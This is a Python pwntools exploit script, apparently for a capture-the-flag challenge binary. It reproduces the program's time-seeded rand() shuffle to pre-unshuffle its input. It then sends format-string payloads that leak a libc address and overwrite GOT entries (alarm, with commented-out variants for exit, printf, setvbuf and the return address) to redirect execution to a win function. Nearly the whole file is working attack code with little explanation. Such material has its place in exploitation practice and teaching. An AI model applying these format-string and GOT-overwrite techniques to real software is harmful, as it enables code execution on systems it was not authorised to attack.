from pwn import *
import ctypes

LIBC = ctypes.CDLL("/lib/x86_64-linux-gnu/libc.so.6")
elf = context.binary = ELF("./main")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# libc = ELF("./libc6_2.27-3ubuntu1.5_amd64.so")
NC = "51.161.84.3:29119".split(":")






while 69:
    # r = remote(NC[0],NC[1])
    r = process("./main")
    t = LIBC.time(0)


    def goto(n):
        r.sendlineafter(b"Choice: ", str(n).encode())

    def swap_string(msg: bytes, t):
        LIBC.srand(t)
        msg = msg.split(b"\x00")[0]
        msg = list(msg)
        n = len(msg)
        v4 = [LIBC.rand() % (i + 1) for i in range(n - 1, 0 , -1)][::-1]
        for i in range(1, n):
            v2 = msg[i]
            msg[i] = msg[v4[i-1]]
            msg[v4[i-1]] = v2
        return bytes(msg)



    def shuffled_string(msg):
        goto(1)
        r.sendlineafter(b"String: ", msg)
        r.recvuntil(b": ")
        return r.recvline(0)

    def get_correct_t(t):
        payload = b"abcdefghijklmnopqrstuvwxyz"
        hasil1 = shuffled_string(payload)
        hasil2 = swap_string(payload, t)
        print(hasil1,hasil2)
        if hasil2 == hasil1:
            return True
        return False

    payload = b"123456789abcdef"
    r.sendline(b"1")
    r.sendline(swap_string(payload, t))
    r.recvuntil(b"string: ")
    result = r.recvline(0)
    if payload != result:
        print(payload, result)
        r.close()
        continue


    # if not get_correct_t(t):
    #     r.close()
    #     continue
    break

offset = 10520
# for i in range(80,100):
#     r.sendline(b"1")
#     r.sendline(swap_string(f"%{i}$p".encode(), t))
#     r.recvuntil(b"string: ")
#     print(r.recvline(0), i)

# r.sendline(b"1")
# r.sendline(swap_string(f"%{93}$p".encode(), t))
# r.recvuntil(b"string: ")
# leak = eval(r.recvline(0))
# print(hex(leak))
# rip = leak - 232
# print(hex(rip))
# libc.address = leak - 0x24083 #leak + offset
# print(hex(libc.address))

r.sendline(b"1")
r.sendline(swap_string(f"%{85}$p".encode(), t))
r.recvuntil(b"string: ")
leak = eval(r.recvline(0))
libc.address = leak - 147587
print(hex(libc.address))


# rip = 0x404048
win = 0x401336
exitgot = 0x404088

print(hex(libc.sym.system))
# last_3_byte = [(libc.sym.system >> (8*i)) & 0xff for i in range(3)]
# print(list(map(hex,last_3_byte)))

#payload = f"%{last_3_byte[0]}c%19$hhn%{last_3_byte[1]-last_3_byte[0]}c%20$hhn%{last_3_byte[2]-last_3_byte[1]}c%21$hhn".encode().ljust(40,b"a") + p64(elf.got.exit) + p64(elf.got.exit + 1) + p64(elf.got.exit + 2) 
# print(payload)

#payload = f"%{last_3_byte[1]}c%19$hhn%{last_3_byte[2]-last_3_byte[1]}c%20$hhn".encode().ljust(24,b"a") + p64(elf.got.printf+1) + p64(elf.got.printf+2)
# payload = f"%19$n".encode().ljust(24,b'a') + p64(elf.got.exit)  
# payload = f"%{win & 0xff}c%20$hhn%{((win >> 8) - 0x36) & 0xff}c%21$hhn".encode().ljust(32,b'a') + p64(elf.got.setvbuf) + p64(elf.got.setvbuf+1)  
payload = f"%{0x36}c%19$lln%{0x4011 - 0x36}c%20$hn".encode().ljust(24,b"a") + p64(elf.got.alarm) + p64(elf.got.alarm + 1)
print(len(payload))
r.sendline(b"1")
r.sendline(swap_string(payload, t))


# payload = f"%{0x36}c%19$hhn".encode().ljust(24,b"a") + p64(rip)
# print(payload)

# r.sendline(b"1")
# r.sendline(swap_string(payload, t))

# payload = f"%{0x13}c%19$hhn".encode().ljust(24,b"a") + p64(rip+1)
# print(payload)

# r.sendline(b"1")
# r.sendline(swap_string(payload, t))

# payload = f"%{0x40}c%19$hhn".encode().ljust(24,b"a") + p64(rip+2)
# print(payload)

# r.sendline(b"1")
# r.sendline(swap_string(payload, t))

# for i in range(3,8):
#     payload = f"%19$hhn".encode().ljust(24,b"a") + p64(rip+i)
#     print(payload)

#     r.sendline(b"1")
#     r.sendline(swap_string(payload, t))




# payload = f"%19$hhn".encode().ljust(24,b"a") + p64(rip+4)
# print(payload)

# r.sendline(b"1")
# r.sendline(swap_string(payload, t))

# payload = f"%19$hhn".encode().ljust(24,b"a") + p64(rip+5)
# print(payload)

# r.sendline(b"1")
# r.sendline(swap_string(payload, t))

# payload = f"kontolijo".encode().ljust(24,b"a")
# print(payload)

# r.sendline(b"1")
# r.sendline(swap_string(payload, t))


# gdb.attach(r)

# r.sendline(b"1")
# r.sendline(swap_string(b"01234567" + b"%16$p", t))

gdb.attach(r)

r.interactive()